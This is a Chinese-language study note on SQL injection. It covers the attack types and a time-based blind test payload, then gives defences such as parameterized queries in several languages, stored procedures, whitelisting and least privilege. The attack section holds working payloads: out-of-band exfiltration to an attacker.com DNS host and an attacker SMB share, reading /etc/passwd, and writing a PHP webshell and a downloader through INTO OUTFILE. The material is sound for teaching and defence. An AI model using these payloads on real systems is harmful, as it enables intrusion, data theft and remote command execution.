### 简介

SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤不严(如动态拼接字符串)

### 类型

* boolean-based blind 基于布尔的盲注
* time-based blind 基于时间的盲注
* error-based 基于报错的SQL注入
* UNION query-based 基于联合查询的SQL注入
* stacked queries 堆叠查询
* out-of-band 带外

### 漏洞影响

（以时间型盲注为例）

**时间型盲注(Time-Based Blind SQL Injection Attacks)**：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断

* Test case
  * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒

* Attacks case
  * 时间型盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
    * 参考[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/) 和 [Timing-based Blind SQL Attacks](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
      * MySQL`SLEEP(time)` `BENCHMARK(count, expr)`
      * SQL Server`WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
      * Oracle
      * Postgres`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
      * ...
    * 自写脚本实现自动化获取(用二分法加速判断)

```
test.get_version() #获取版本号
test.get_user_first() #获取数据库用户权限
test.get_user_count() #获取数据库用户数量
test.get_user_len() #获取数据库用户长度
test.get_user() #获取数据库当前用户名
test.get_db_count() #获取数据库数量
test.get_db_len() #获取数据库长度
test.get_database() #获取数据库名
test.get_table_len() #获取表名长度
test.get_table() #获取表名
test.get_columns_len() #获取字段名长度
test.get_columns() #获取字段名
test.get_content() #获取第一列第一个字段内容
```


[SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)

* 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
  * DNS Requests - `LOAD_FILE`可以发出DNS请求
    * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
    * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
* 绕过判断
  * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
* 文件读写 - 前提:当前数据库user有FILE权限
  * 读取文件(Reading Files)
    * MySQL - `LOAD_FILE()`
    * 例1 `SELECT LOAD_FILE('/etc/passwd');` `SELECT LOAD_FILE(0x2F6574632F706173737764);`
  * 写入文件(Writing Files)
    * MySQL - `INTO OUTFILE` 或 `INTO DUMPFILE`
    * 例1 Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
    * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`

### SQLi - BypassWAF

* 用注释分割关键字
* HTTP参数污染(HTTP Parameter Pollution)
* ...

### 重点检测

* 无法使用"预编译语句"的情况
  * `order by`
  * `limit`
* 宽字节注入
* ...

### SDL - 防御与修复方案

* 1.使用带有"参数化查询"的"预编译语句"

"参数化查询"(Parameterized Query 或 Parameterized Statement)的原理:强制开发人员先定义好所有SQL代码，然后将每个"实际参数"传入并查询。这种编码风格使数据库能够区分"代码"和"数据".


PHP - [使用PDO(PHP Data Objects)](https://php.net/manual/en/book.pdo.php) 支持任意数据库
```
// PDO常用函数
// PDOStatement::bindColumn — Bind a column to a PHP variable
// PDOStatement::bindParam — Binds a parameter to the specified variable name   bindParam()方法 可进行 强类型参数化查询(strongly typed parameterized queries)
// PDOStatement::bindValue — Binds a value to a parameter


// 实例化数据抽象层对象
$db = new PDO('pgsql:host=127.0.0.1;port=5432;dbname=testdb'); 
// 对 SQL 语句执行 prepare，得到 PDOStatement 对象 
$stmt = $db->prepare('SELECT * FROM "myTable" WHERE "id" = :id AND "is_valid" = :is_valid'); 
// 绑定参数
$stmt->bindValue(':id', $id); 
$stmt->bindValue(':is_valid', true); 
// 查询
$stmt->execute(); 
// 输出数据
foreach($stmt as $row) { 
var_dump($row); 
}
```

PHP - 使用MySQLi (仅支持MySQL数据库)
```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
$stmt->bind_param('s', $name);
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // do something with $row
}
```


.NET
```
// "参数化查询"
// 如 使用带有"绑定变量"的SqlCommand()函数 OleDbCommand()函数

String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
  OleDbCommand command = new OleDbCommand(query, connection);
  command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
} catch (OleDbException se) {
  // error handling
} 
```


JAVA - 原生函数
```
// 预编译语句PreparedStatement()  需要和"参数绑定"一起使用

// This should REALLY be validated too
String custname = request.getParameter("customerName"); 
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname); 
ResultSet results = pstmt.executeQuery( );
```

JAVA - Hibernate框架的`.createQuery()`函数与`.setParameter()`
```
// Hibernate Query Language (HQL) - Prepared Statement
// 在Hibernate中，绑定变量(bind variables) 被称为 "Named Parameters"

//不安全的HQL语句查询
//First is an unsafe HQL Statement
Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");

//安全的HQL语句查询
//Here is a safe version of the same query using named parameters
Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
safeHQLQuery.setParameter("productid", userSuppliedParameter);
```

SQLite
```
sqlite3_prepare()
```

Golang
```
// 对Postgres数据库
// This is for Postgres. Other SQL variants may use the ? character.
db.Exec("INSERT INTO users(name, email) VALUES($1, $2)",
  "Jon Calhoun", "jon@calhoun.io")
```

```
// 对mysql数据库
// http://mindbowser.com/golang-go-database-sql/
package main
 import (
 _ "github.com/go-sql-driver/mysql"
 "database/sql"
 "log"
 )
 
 func main(){
 db, err := sql.Open("mysql", "root:root@tcp(127.0.0.1:3306)/employeedb")
 
 // Connection Pooling methods
 db.SetConnMaxLifetime(500)
 db.SetMaxIdleConns(50)
 db.SetMaxOpenConns(10)
 db.Stats()
 
 if err != nil {
 log.Fatal(err)
 }
 tx,_:=db.Begin()
 stmt, err := tx.Prepare("INSERT INTO user(id,username) VALUES(?,?)")
 res,err:=stmt.Exec(4,"Abhijit")
 res,err=stmt.Exec(5,"Yogesh")
 if err!=nil{
 tx.Rollback()
 log.Fatal(err)
 }
 tx.Commit()
 log.Println(res)
}
```


* 2. 存储过程

存储过程的安全性和预编译语法相同。
存储过程是用"SQL代码"定义和存储在数据库中的，使用时被应用程序调用。
如果使用了存储过程，开发者应该避免在存储过程中生成不安全的动态SQL查询语句。
```
//JAVA中使用存储过程，该存储过程已经定义在数据库中:
String custname = request.getParameter("customerName");
try {
    CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
    cs.setString(1, custname);
    ResultSet results = cs.executeQuery();
} catch (SQLException se) {
}
```

* 3. 白名单输入验证(White List Input Validation) 

如`order by`和`limit`子句，无法使用"绑定变量"(bind variable)，就需要"白名单输入验证"

* 4. 数据库用户权限最小化(Least Privilege)

参考OWASP [SQL_Injection_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)
